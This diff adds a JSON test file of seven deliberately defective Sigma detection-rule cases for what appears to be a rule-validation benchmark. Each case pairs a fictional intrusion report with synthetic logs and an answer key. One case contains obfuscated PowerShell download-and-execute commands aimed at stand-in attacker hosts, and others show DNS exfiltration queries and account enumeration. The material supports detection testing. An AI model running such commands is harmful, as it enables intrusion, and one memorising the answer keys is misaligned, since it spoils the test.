@@ -1,0 +1,486 @@
+{
+ "cases": [
+  {
+   "assumptions": [],
+   "defect_class": "D6",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "net localgroup \"Remote Desktop Users\"",
+      "image": "C:\\Windows\\System32\\net.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\itadmin"
+     },
+     {
+      "cmd": "net use Z: \\\\fs01.cranemail.test\\share",
+      "image": "C:\\Windows\\System32\\net.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\notes.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "C:\\Windows\\Explorer.EXE",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "taskhostw.exe",
+      "image": "C:\\Windows\\System32\\taskhostw.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\svchost.exe",
+      "parent_cmd": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "net user",
+      "image": "C:\\Windows\\System32\\net.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-backup"
+     },
+     {
+      "cmd": "net localgroup administrators",
+      "image": "C:\\Windows\\System32\\net.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-backup"
+     },
+     {
+      "cmd": "net user svc-backup",
+      "image": "C:\\Windows\\System32\\net.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-backup"
+     }
+    ]
+   },
+   "evidence": [
+    "the net.exe utility invoked repeatedly with the argument net user, and then net localgroup administrators to identify privileged accounts",
+    "the same net.exe sequence ran more than five times within one minute"
+   ],
+   "expected_gate": "G3",
+   "id": "D6-01",
+   "logsource": "windows_process_creation",
+   "report_text": "Incident summary for the intrusion cluster tracked as CRANEFALL. After gaining a foothold on a file server at a regional logistics firm, the operator opened an interactive command shell and enumerated local accounts in rapid succession. Responders recovered the shell history, which shows the net.exe utility invoked repeatedly with the argument net user, and then net localgroup administrators to identify privileged accounts. The activity was scripted: the same net.exe sequence ran more than five times within one minute, which is not how an administrator normally works interactively. The operator used no third-party enumeration tooling at this stage and relied only on built-in utilities. Account names harvested this way were later used for password guessing against the file server. Analysts assess the enumeration as preparation for privilege escalation and credential theft. No malware was dropped during this phase.",
+   "role": "defective",
+   "sigma_yaml": "title: Scripted Local Account Enumeration with net.exe\nid: 7c1d4e2a-3b58-4f6e-9a0d-1e2f3a4b5c61\nstatus: experimental\ndescription: Detects repeated execution of net.exe to enumerate local accounts and the local administrators group in a short interval.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.discovery\n  - attack.t1087.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\net.exe'\n    CommandLine|contains:\n      - 'net user'\n      - 'localgroup administrators'\n  condition: selection | count() > 5\nfalsepositives:\n  - Administrators auditing local accounts by hand\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1087.001"
+   ],
+   "why": "The condition 'selection | count() > 5' is a count aggregation introduced with '|', which the accepted Sigma subset explicitly excludes (count, near, timeframe, aggregation with '|'). The log source, fields, values, metadata and ATT&CK tags are otherwise valid and every value is quoted in the evidence."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D6",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "192.0.2.30",
+      "dest_port": "445",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.30",
+      "dest_port": "135",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "198.51.100.25",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Fabrikam Browser\\browser.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.123",
+      "dest_port": "123",
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "203.0.113.77",
+      "dest_port": "8443",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "203.0.113.77",
+      "dest_port": "9001",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "Network telemetry showed rundll32.exe opening outbound connections to 203.0.113.77 on port 8443 and, on later days, on port 9001",
+    "outbound connections initiated from rundll32.exe to ports above 8000"
+   ],
+   "expected_gate": "G3",
+   "id": "D6-02",
+   "logsource": "windows_network_connection",
+   "report_text": "Investigation note for the WETMARSH campaign. A malicious DLL was executed through rundll32.exe from a user-writable directory, and the process then beaconed to a staging server. Network telemetry showed rundll32.exe opening outbound connections to 203.0.113.77 on port 8443 and, on later days, on port 9001, so the operator evidently rotated through high ports. Analysts note that rundll32.exe does not normally make network connections at all, and certainly not to unusual high ports. Blocking the staging address alone was judged insufficient because the actor re-provisioned its infrastructure twice during the engagement. The recommended detection focus is therefore the behaviour of the process itself: outbound connections initiated from rundll32.exe to ports above 8000. Standard web and file-sharing ports were not used by the beacon in any of the observed cases. The infrastructure belongs to a commercial hosting provider.",
+   "role": "defective",
+   "sigma_yaml": "title: Rundll32 Outbound Connection to High Destination Port\nid: a93f0b17-6d24-4c8e-b5a1-7e90d2c4f318\nstatus: experimental\ndescription: Detects rundll32.exe initiating outbound network connections to destination ports above 8000.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1571\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\rundll32.exe'\n    DestinationPort|gt: 8000\n    Initiated: 'true'\n  condition: selection\nfalsepositives:\n  - Uncommon administrative tooling that loads a network-aware DLL through rundll32.exe\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1571"
+   ],
+   "why": "DestinationPort|gt is a numeric comparison modifier, and the accepted Sigma subset allows only exact, contains, startswith, endswith, re, all and windash. The rest of the rule (log source, fields, values, tags, metadata) is valid and its values appear in the evidence."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D6",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SGVsbG8gV29ybGQ='))\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\itadmin"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "ping 192.0.2.1",
+      "image": "C:\\Windows\\System32\\PING.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\todo.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "C:\\Windows\\Explorer.EXE",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -nop -w hidden -c \"$m=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RG93bmxvYWRTdHJpbmc=')); $w=New-Object Net.WebClient; IEX $w.$m('http://stage.filewren.test/a.ps1')\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "C:\\Windows\\Explorer.EXE",
+      "user": "LAB\\frank"
+     },
+     {
+      "cmd": "powershell.exe -ep bypass -c \"$n=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RG93bmxvYWRTdHJpbmc=')); (New-Object Net.WebClient).$n('http://cdn.filewren.invalid/s2.ps1') | IEX\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "C:\\Windows\\Explorer.EXE",
+      "user": "LAB\\gina"
+     }
+    ]
+   },
+   "evidence": [
+    "the script never writes the method name DownloadString in plain text",
+    "Detection should therefore look for the base64 form of DownloadString inside powershell.exe command lines rather than the plain word"
+   ],
+   "expected_gate": "G3",
+   "id": "D6-03",
+   "logsource": "windows_process_creation",
+   "report_text": "Analysis of the FILEWREN first-stage loader. The loader is started by powershell.exe from a malicious shortcut file. To evade simple string signatures, the script never writes the method name DownloadString in plain text. Instead the powershell.exe command line carries the method name as a base64-encoded fragment, which is decoded at runtime with the Convert class and then used to call the method on a WebClient object. In every sample reviewed, the fragment RG93bmxvYWRTdHJpbmc= appeared directly in the command line. Analysts note that this differs from the more common EncodedCommand switch, because only the method name is encoded and the rest of the command stays readable. The decoded method retrieves a second-stage script from an attacker-controlled web server. Detection should therefore look for the base64 form of DownloadString inside powershell.exe command lines rather than the plain word.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell Command Line with Base64-Encoded DownloadString Method Name\nid: 5e8a2c64-91f7-4d03-8b3e-c6a41d7f20b9\nstatus: experimental\ndescription: Detects powershell.exe command lines that carry the DownloadString method name in base64 form instead of plain text.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1059.001\n  - attack.stealth\n  - attack.t1027\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    CommandLine|base64offset|contains: 'DownloadString'\n  condition: selection\nfalsepositives:\n  - Administrative scripts that deliberately obfuscate method names before packaging\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1059.001",
+    "T1027"
+   ],
+   "why": "The CommandLine key uses the base64offset modifier ahead of the supported contains modifier (CommandLine|base64offset|contains), and base64offset is not in the accepted modifier set. A check that inspects only the final modifier would see 'contains' and miss it. The remainder of the rule is valid and evidence-backed."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D6",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "image": "C:\\Program Files\\Fabrikam NetHealth\\nhagent.exe",
+      "kind": "dns_query",
+      "name": "nh-status.fabrikam.test"
+     },
+     {
+      "image": "C:\\Program Files\\Fabrikam Browser\\browser.exe",
+      "kind": "dns_query",
+      "name": "forum.nightheron-birdclub.example"
+     }
+    ],
+    "negative": [
+     {
+      "image": "C:\\Program Files\\Fabrikam Browser\\browser.exe",
+      "kind": "dns_query",
+      "name": "www.cranemail.test"
+     },
+     {
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "dns_query",
+      "name": "time.fabrikam.example"
+     }
+    ],
+    "positive": [
+     {
+      "image": "C:\\ProgramData\\Fabrikam\\svchelper.exe",
+      "kind": "dns_query",
+      "name": "update.nightheron.test"
+     },
+     {
+      "image": "C:\\ProgramData\\Fabrikam\\svchelper.exe",
+      "kind": "dns_query",
+      "name": "nh-48656c6c6f776f726c64.relay.example"
+     },
+     {
+      "image": "C:\\ProgramData\\Fabrikam\\svchelper.exe",
+      "kind": "dns_query",
+      "name": "sync.nightheron.invalid"
+     }
+    ]
+   },
+   "evidence": [
+    "it resolves its command domains, which are update.nightheron.test and sync.nightheron.invalid, to learn the current tasking",
+    "svchelper.exe sends query names whose first label begins with the prefix nh- followed by hex-encoded chunks of stolen data"
+   ],
+   "expected_gate": "G3",
+   "id": "D6-04",
+   "logsource": "windows_dns_query",
+   "report_text": "Sandbox write-up for the NIGHTHERON backdoor, which is delivered as svchelper.exe. The implant communicates exclusively over DNS. At start-up it resolves its command domains, which are update.nightheron.test and sync.nightheron.invalid, to learn the current tasking. During data theft it switches to a second behaviour in which svchelper.exe sends query names whose first label begins with the prefix nh- followed by hex-encoded chunks of stolen data, directed at relay domains chosen by the operator. The second behaviour was seen with several different relay domains, so a domain list alone does not cover it. The binary is placed in a user-writable folder and has no legitimate counterpart in the environment. Both behaviours were reproduced three times in the sandbox with consistent results, and no other process produced queries with this prefix.",
+   "role": "defective",
+   "sigma_yaml": "title: NIGHTHERON Backdoor DNS Command and Exfiltration Queries\nid: d2406b8f-0c5e-4a79-a1d3-3f8b97e6c254\nstatus: experimental\ndescription: Detects DNS queries to the NIGHTHERON command domains and nh- prefixed exfiltration queries sent by svchelper.exe.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1071.004\nlogsource:\n  category: dns_query\n  product: windows\ndetection:\n  selection_domains:\n    QueryName|endswith:\n      - '.nightheron.test'\n      - '.nightheron.invalid'\n  selection_exfil:\n    Image|endswith: '\\svchelper.exe'\n    QueryName|startswith: 'nh-'\n  condition: 1 of them\nfalsepositives:\n  - Third-party software that uses host names beginning with nh-\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1071.004"
+   ],
+   "why": "The condition '1 of them' uses a quantifier target ('them') that is not one of the accepted forms '1 of selection*' and 'all of selection*'. It is valid Sigma and reads like a supported form, but it falls outside the declared subset. Fields, values, tags and metadata are otherwise valid and evidence-backed."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D6",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "rundll32.exe C:\\Fabrikam\\Help\\hlp.dll,Start",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Fabrikam\\Help\\fabhelp.exe",
+      "parent_cmd": "\"C:\\Fabrikam\\Help\\fabhelp.exe\" --background",
+      "user": "LAB\\alice"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "notepad.exe C:\\Users\\bob\\readme.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "C:\\Windows\\Explorer.EXE",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "calc.exe",
+      "image": "C:\\Windows\\System32\\calc.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "C:\\Windows\\Explorer.EXE",
+      "user": "LAB\\carol"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "rundll32.exe C:\\ProgramData\\cache\\hlp.dll,Start",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Users\\bob\\AppData\\Local\\Temp\\docviewer.exe",
+      "parent_cmd": "",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "rundll32.exe C:\\ProgramData\\cache\\hlp.dll,Start",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Users\\carol\\Downloads\\docviewer.exe",
+      "parent_cmd": "",
+      "user": "LAB\\carol"
+     }
+    ]
+   },
+   "evidence": [
+    "runs it with the command rundll32.exe C:\\ProgramData\\cache\\hlp.dll,Start",
+    "the child has no parent command line recorded: the ParentCommandLine field is absent"
+   ],
+   "expected_gate": "G3",
+   "id": "D6-05",
+   "logsource": "windows_process_creation",
+   "report_text": "Case notes from the PALEWREN intrusion. A trojanised installer named docviewer.exe drops a DLL called hlp.dll into a folder under the ProgramData directory and then runs it with the command rundll32.exe C:\\ProgramData\\cache\\hlp.dll,Start. The installer terminates within milliseconds of launching the child, so by the time the process-creation event is logged the child has no parent command line recorded: the ParentCommandLine field is absent. Analysts consider this absent-parent condition a useful discriminator, because legitimate rundll32.exe invocations from installers keep the parent alive while the DLL runs. The DLL is a loader that decrypts an embedded payload in memory. Related activity was seen on three hosts at a courier company. Containment involved removing the DLL and blocking the dropper hash. The loader is assessed as a commodity tool sold to several criminal groups.",
+   "role": "defective",
+   "sigma_yaml": "title: Rundll32 Loading hlp.dll Start Export with No Parent Command Line\nid: 18b7f3a9-e4c2-4056-9d8a-52a0c1e7b6f4\nstatus: experimental\ndescription: Detects rundll32.exe running the hlp.dll Start export when the parent process has already exited and no parent command line is recorded.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.011\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\rundll32.exe'\n    CommandLine|contains: 'hlp.dll,Start'\n    ParentCommandLine|exists: false\n  condition: selection\nfalsepositives:\n  - Software that launches a helper through rundll32.exe and exits before the event is logged\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.011"
+   ],
+   "why": "ParentCommandLine|exists uses the exists modifier, which is not in the accepted modifier set (none, contains, startswith, endswith, re, all, windash). The log source, other fields, values, tags and metadata are valid, and the non-boolean values are quoted in the evidence."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D6",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -NoProfile -File C:\\Scripts\\collect.ps1",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe -NoProfile -File C:\\Scripts\\nightly.ps1",
+      "user": "LAB\\itadmin"
+     },
+     {
+      "cmd": "powershell.exe -WindowStyle Hidden -File C:\\Scripts\\backup.ps1",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\svchost.exe",
+      "parent_cmd": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",
+      "user": "LAB\\svc-backup"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "notepad.exe C:\\Users\\dana\\minutes.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "C:\\Windows\\Explorer.EXE",
+      "user": "LAB\\dana"
+     },
+     {
+      "cmd": "ipconfig /all",
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\erin"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABhAD0AMQA=",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe -NoProfile -File C:\\Users\\dana\\AppData\\Local\\Temp\\s1.ps1",
+      "user": "LAB\\dana"
+     },
+     {
+      "cmd": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABiAD0AMgA=",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\erin\\AppData\\Roaming\\s1.ps1",
+      "user": "LAB\\erin"
+     }
+    ]
+   },
+   "evidence": [
+    "the child powershell.exe has an Image identical to its ParentImage and is started with -WindowStyle Hidden",
+    "This self-relaunch pattern was present in all five samples examined"
+   ],
+   "expected_gate": "G3",
+   "id": "D6-06",
+   "logsource": "windows_process_creation",
+   "report_text": "Loader analysis for the SALTMARSH stager. When the malicious document macro runs, it starts powershell.exe to execute the first stage in a visible console. The first stage then immediately relaunches itself so that the visible window closes: in Sysmon process-creation events the child powershell.exe has an Image identical to its ParentImage and is started with -WindowStyle Hidden followed by an encoded second stage. This self-relaunch pattern was present in all five samples examined. Relaunching lets the stager drop the parent console and reduces the chance that the user notices the window. Network behaviour of the second stage is covered in a separate report. In the laboratory we did not see this pattern in routine administrative PowerShell use, where a hidden window combined with a self-relaunch is rare.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell Self-Relaunch with Hidden Window\nid: f4c92e05-7a1b-4b38-86d7-0e3a95c8d172\nstatus: experimental\ndescription: Detects a process whose image is identical to its parent image that is started with a hidden window style, matching the SALTMARSH stager self-relaunch.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1059.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|fieldref: ParentImage\n    CommandLine|contains: '-WindowStyle Hidden'\n  condition: selection\nfalsepositives:\n  - Administrative scripts that relaunch PowerShell with a hidden window\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1059.001"
+   ],
+   "why": "Image|fieldref compares the Image field to another field (ParentImage); fieldref is not in the accepted modifier set. The rest of the rule uses valid fields, tags and metadata, and its values (including the referenced field name and the command-line flag) are quoted in the evidence."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D6",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "192.0.2.60",
+      "dest_port": "7070",
+      "image": "C:\\Program Files\\Fabrikam Support\\fsclient.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "203.0.113.10",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Fabrikam Browser\\browser.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.53",
+      "dest_port": "53",
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "198.51.100.40",
+      "dest_port": "7070",
+      "image": "C:\\Program Files\\HelpBridge\\hbclient.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "198.51.100.44",
+      "dest_port": "7070",
+      "image": "C:\\Users\\gina\\AppData\\Local\\HelpBridge\\hbclient.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "The client binary hbclient.exe maintains an outbound session to a vendor relay at 198.51.100.40 on TCP port 7070",
+    "flag outbound connections from hbclient.exe to TCP port 7070"
+   ],
+   "expected_gate": "G3",
+   "id": "D6-07",
+   "logsource": "windows_network_connection",
+   "report_text": "Software-inventory review at a partner site found that an unapproved remote support program, HelpBridge, had been installed on three workstations. The client binary hbclient.exe maintains an outbound session to a vendor relay at 198.51.100.40 on TCP port 7070. Because the program is not on the approved software list and gives full remote control of the desktop, its use is treated as a remote access tool under the organisation's policy. The vendor documentation states that the client falls back to ports 443 and 80 if port 7070 is blocked, but on the observed hosts only port 7070 was used. Connections began shortly after user logon and persisted through the working day. Recommended detection: flag outbound connections from hbclient.exe to TCP port 7070.",
+   "role": "defective",
+   "sigma_yaml": "title: Unapproved HelpBridge Remote Access Client Connection\nid: 3a65d0c8-b2e9-4f17-a4c6-9d18e7f05b23\nstatus: experimental\ndescription: Detects outbound connections from the unapproved HelpBridge client hbclient.exe to its relay port 7070.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1219\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\hbclient.exe'\n    DestinationPort: '7070'\n    Initiated: 'true'\n  timeframe: 15m\n  condition: selection\nfalsepositives:\n  - Sanctioned use of HelpBridge by the IT help desk\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1219"
+   ],
+   "why": "The detection block contains a 'timeframe: 15m' key, and timeframe is on the accepted subset's list of disallowed constructs. The condition itself is a plain 'selection', so a check that only parses the condition string would not see it. Everything else (fields, values, tags, metadata, log source) is valid and evidence-backed."
+  }
+ ]
+}
